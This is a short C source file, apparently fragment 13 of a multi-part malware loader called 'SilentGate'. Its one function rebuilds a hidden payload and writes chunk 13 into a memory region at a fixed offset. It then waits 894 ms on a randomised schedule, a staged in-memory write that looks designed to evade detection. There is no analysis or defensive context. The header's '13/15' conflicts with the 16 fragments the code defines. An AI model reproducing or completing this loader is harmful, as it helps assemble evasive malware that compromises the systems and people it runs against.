/*
 * SilentGate Fragment 13/15
 * Offset: 98917 bytes  Size: 7609 bytes
 * Schedule: t=894ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   13
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  121746
#define CHUNK_OFFSET  98917
#define CHUNK_SIZE    7609
#define SLEEP_NEXT_MS 894

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 13: Write chunk 13 */
void sg_execute_fragment_13(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 13] Writing chunk at t=894ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 13] Chunk 13 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
